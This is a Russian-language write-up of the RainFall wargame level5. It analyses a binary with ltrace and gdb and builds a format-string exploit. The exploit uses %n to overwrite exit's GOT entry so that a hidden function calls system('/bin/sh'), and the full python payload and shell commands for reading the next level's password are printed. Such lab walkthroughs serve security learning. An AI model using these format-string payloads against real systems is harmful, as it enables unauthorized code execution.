# Решение
python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' > /tmp/destroy
cat /tmp/destroy - | ./level5

cd ../level6
cat .pass

# Объяснение

1. Анализируем поведение программы
level5@RainFall:~$ ./level5
asd
asd

level5@RainFall:~$ ./level5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


Принимает символы на стандартный ввод и выводит их на стандартный вывод.
Буффер не переполняется.

2. ltrace
level5@RainFall:~$ ltrace ./level5
__libc_start_main(0x8048504, 1, 0xbffff6f4, 0x8048520, 0x8048590 <unfinished ...>
fgets(AAAA
"AAAA\n", 512, 0xb7fd1ac0)                                = 0xbffff440
printf("AAAA\n"AAAA
)                                                = 5
exit(1 <unfinished ...>
+++ exited (status 1) +++

Как видим, используется защищенная версия gets - fgets. Которая имеет ограничение по считываемым символам.
Затем, введенная нами последовательность символов выводится через принтф, помещаясь в управляющую строку - небезопасно.

3. GDB

(gdb) disas main
   0x0804850a <+6>:	call   0x80484c2 <n>

В функции main вызывается функция n.

(gdb) disas n
   0x080484c2 <+0>:	    push   %ebp                   // пролог
   0x080484c3 <+1>:	    mov    %esp,%ebp
   0x080484c5 <+3>:	    sub    $0x218,%esp            // выделяется 536 байт на стеке
   0x080484cb <+9>:	    mov    0x8049848,%eax         // поместить адрес stdin в регистр EAX (x/1cb 0x8049848)
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)         // поместить адрес stdin из регистра EAX на стек (3 аргумент)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)       // поместить значение 512 на стек (2 аргумент)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax      // поместить адрес из EBP - 520 в регистр EAX - это буфер
   0x080484e2 <+32>:	mov    %eax,(%esp)            // поместить адрес буфера на стек (1 аргумент)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>  // вызывать функцию fgets с аргументами, указанными выше, на стек. (1 аргумент)
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax      // поместить адрес буфера в регистр EAX
   0x080484f0 <+46>:	mov    %eax,(%esp)            // поместить адрес буфера из регистра EAX на вершину стека (1 аргумент)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt> // вызов функции printf с аргументом в виде буфера
   0x080484f8 <+54>:	movl   $0x1,(%esp)            // помещаем 1 на вершину стека
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>   // вызываем функцию exit с аргументом 1

В функции n происходит защищенное считывание в буфер, однако буфер помещается в форматную строку printf,
что позволит эксплуатировать уязвимость форматной строки. Тк же обратим внимания, что функция не выполнит возврат,
тк в ней вызывается exit.

(gdb) disas o
   0x080484a4 <+0>:	    push   %ebp                   // пролог
   0x080484a5 <+1>: 	mov    %esp,%ebp
   0x080484a7 <+3>: 	sub    $0x18,%esp             // выделяем 24 байта на стеке
   0x080484aa <+6>:	    movl   $0x80485f0,(%esp)      // кладем адрес строки "/bin/sh" (x/8cb 0x80485f0) на стек (аргумент)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt> // вызываем функцию system с аргументом "/bin/sh"
   0x080484b6 <+18>:	movl   $0x1,(%esp)            // кладем значение 1 на стек (аргумент)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>  // вызываем функцию exit с аргументом 1

Функция o нигде не вызывается, однако в ней расположено то, что нам нужно, а именно - вызов system("/bin/sh").
В ней так же нет возврата, тк использована функция _exit.


4. Взлом.

Задача: с помощью уязвимости командной строки поместить адрес функции o в память так, чтобы она была вызвана.

Все дальнейший действия производятся с функцией n.

Так как, до адреса возврата($EBX+4) мы не доберемся из-за функции exit,
мы должны как-то переписать адрес вызова exit.
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
Адрес 0x80483d0 мы переписать не можем, так как он расположен в защищенной области кода.

Функция exit:
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
как видим, тут указан plt адрес функции exit.
PLT - таблица привязки процедур, чтобы найти реальный адрес в GOT(глобальной таблице смещения),
надо дизассемблировать <exit@plt>.

(gdb) disas 0x80483d0
   0x080483d0 <+0>:	    jmp    *0x8049838 -- реальный адрес exit лежит тут
   0x080483d6 <+6>:	    push   $0x28
   0x080483db <+11>:	jmp    0x8048370

(gdb) x/x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6

А вот реальный адрес exit мы сожем переписать)

Осуществим это с помощью спецификатора %n функции printf.
Для начала посмотрим, каким аргументом для функции printf будет лежать первое 4байтное значение из введенной нами строки.
level5@RainFall:~$ python -c 'print "AAAA" + "%x "*10' > /tmp/test
level5@RainFall:~$ cat /tmp/test | ./level5
AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520
                             ||
                          4 аргумент

Подготовим эксплойт.
python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'
Расшифровка:
\x38\x98\x04\x08 == 0x8049838 -- адрес, в котором лежит адрес exit)
%134513824x == 0x080484a4(адрес функции o) - 4 (4 байта, занятые адресом 0x8049838)
%4$n - запись количества выведенных символов по вдресу, указанному как 4 аргумент.